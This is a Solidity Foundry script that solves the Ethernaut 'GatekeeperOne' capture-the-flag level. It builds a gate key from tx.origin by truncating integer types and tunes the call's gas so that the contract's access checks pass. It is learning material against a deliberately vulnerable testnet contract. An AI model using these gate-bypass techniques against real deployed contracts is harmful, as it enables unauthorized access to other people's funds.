// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
    // forge script script/solutions/13-GatekeeperOne.s.sol:GatekeeperOneSolution --rpc-url $SEPOLIA_RPC

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);
        console2.log("Challenge address: ", challengeInstance);

        // YOUR SOLUTION HERE
        GateBreaker gateBreaker = new GateBreaker(challengeInstance);
        gateBreaker.hack(256);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(13));
    }
}

contract GateBreaker {
    IGatekeeperOne gatekeeperOne;

    constructor(address gatekeeperOne_) {
        gatekeeperOne = IGatekeeperOne(gatekeeperOne_);
    }

    function hack(uint256 gas_) external {
        // uint64 k = uint64(_gateKey);
        // 1. uint32(k) == uint16(k)
        // 2. uint32(k) != k
        // 3. uint32(k) == uint16(uint160(tx.origin))

        // start from 3. and also satisfy 1. at the same time
        uint16 k16 = uint16(uint160(tx.origin));

        // If an integer is explicitly converted to a smaller type, higher-order bits are cut off
        // see: https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);

        gatekeeperOne.enter{gas: 8191 * 10 + gas_}(key);
    }
}
